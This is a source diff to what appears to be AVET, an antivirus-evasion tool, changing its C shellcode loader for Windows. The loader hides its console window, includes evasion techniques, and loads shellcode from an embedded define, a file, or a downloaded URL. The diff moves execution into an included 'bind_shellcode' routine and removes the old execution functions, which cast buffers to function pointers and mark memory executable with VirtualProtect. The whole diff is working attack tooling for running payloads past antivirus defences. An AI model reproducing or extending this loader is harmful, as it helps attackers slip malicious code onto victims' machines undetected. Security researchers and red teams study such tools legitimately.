@@ -38,16 +38,16 @@ Web: https://github.com/govolution/avet
 #endif
 #include <windows.h>
 
+
+// Include shellcode binding technique to be used here
+#include "shellcode_binding.h"
+
+
 int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-void exec_shellcode(unsigned char *shellcode);
-void exec_shellcode64(unsigned char *shellcode);
 #ifdef UVALUE
 char* ie_download(char* string, char* sh_filename);
-#endif
-#ifdef ASCIIMSF
-void exec_shellcode_ASCIIMSF(unsigned char *shellcode);
 #endif
 #ifdef DOWNLOADEXECSC
 unsigned char* downloadshellcode(char* uri);
@@ -59,8 +59,8 @@ int main (int argc, char **argv)
 		ShowWindow(GetConsoleWindow(), SW_HIDE);
 	#endif
 		
-	char *fvalue = NULL;
 	char *uvalue = NULL;
+	char *fvalue = NULL;
 
 	int index;
 	int c;
@@ -69,6 +69,11 @@ int main (int argc, char **argv)
 	
 	// Include evasion techniques to be used here
 	#include "techniques.h"	
+	
+	// Bind and execute shellcode here
+	// FVALUE is defined in defs.h by make_avet and contains the shellcode	
+	bind_shellcode(buf);
+	
 
 //#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
 //download a file and write to disk
@@ -104,19 +109,13 @@ int main (int argc, char **argv)
 			printf ("Non-option argument %s\n", argv[index]);
 	#endif
 
-// compute #defines from defs.h
-#ifdef FVALUE
-	int size = strlen(FVALUE);
-	fvalue=(char*)malloc(size);
-	strcpy(fvalue,FVALUE);
-#endif
-
 #ifdef UVALUE
 	int size = strlen(UVALUE);
 	uvalue=(char*)malloc(size);
 	strcpy(uvalue,UVALUE);
 #endif
 
+/*
 	// exec shellcode from a given file or from defs.h
 	if (fvalue)
 	{
@@ -131,11 +130,6 @@ int main (int argc, char **argv)
 		size = get_filesize(fvalue);
 		buffer = load_textfile(fvalue, buffer, size);
 #endif
-	#ifdef FVALUE
-		size = strlen (FVALUE);
-		buffer = FVALUE;
-	#endif
-
 	#ifdef ENCRYPT 
 		#ifdef PRINT_DEBUG
 		printf ("size %d\n",size);
@@ -158,19 +152,9 @@ int main (int argc, char **argv)
 	#endif
 	#endif
 	#endif
-
-	#ifndef X64 
-	#ifndef ASCIIMSF
-		exec_shellcode(shellcode);
-	#endif
-	#ifdef ASCIIMSF
-		exec_shellcode_ASCIIMSF(shellcode);
-	#endif
-	#endif
-	#ifdef X64
-		exec_shellcode64(shellcode);
-	#endif
 	}
+	
+*/
 	// exec from url
 #ifdef UVALUE
 	else if (uvalue)
@@ -197,23 +181,11 @@ int main (int argc, char **argv)
 #else
 		shellcode = buf;
 #endif
-#ifndef X64 
-		exec_shellcode(shellcode);
-#endif
-#ifdef X64
-		exec_shellcode64(shellcode);
-#endif
 	}
 #endif
 
 #ifdef DOWNLOADEXECSC
 	unsigned char *shellcode = downloadshellcode(argv[1]);
-#ifndef X64
-	exec_shellcode(shellcode);
-#endif
-#ifdef X64
-	exec_shellcode64(shellcode);
-#endif
 #endif
 
 	return 0;
@@ -369,53 +341,6 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 
 	return shellcode;
 }
-
-#ifndef X64
-#ifndef ASCIIMSF
-void exec_shellcode(unsigned char *shellcode)
-{
-	#ifdef PRINT_DEBUG
-		printf("exec_shellcode\n ");
-		int size=strlen(shellcode);
-		printf("shellcode size: %d\n", size);
-	#endif
-
-	int (*funct)();
-	funct = (int (*)()) shellcode;
-	(int)(*funct)();
-}
-#endif
-#ifdef ASCIIMSF
-void exec_shellcode_ASCIIMSF(unsigned char *shellcode)
-{
-	#ifdef PRINT_DEBUG
-		printf("exec_shellcode_ASCIIMSF\n ");
-		int size=strlen(shellcode);
-		printf("shellcode size: %d\n", size);
-	#endif
-
-	register unsigned char* r asm("eax");
-	r=shellcode;
-	asm("call *%eax;");
-}
-#endif
-#endif
-
-
-#ifdef X64
-void exec_shellcode64(unsigned char *shellcode)
-{
-#ifdef PRINT_DEBUG
-	printf("exec_shellcode64\n ");
-	int size=strlen(shellcode);
-	printf("shellcode size: %d\n", size);
-#endif
-	int len=strlen(shellcode);
-	DWORD l=0;
-	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
-	(* (int(*)()) shellcode)();
-}
-#endif
 
 #ifdef UVALUE
 // return pointer to the filename
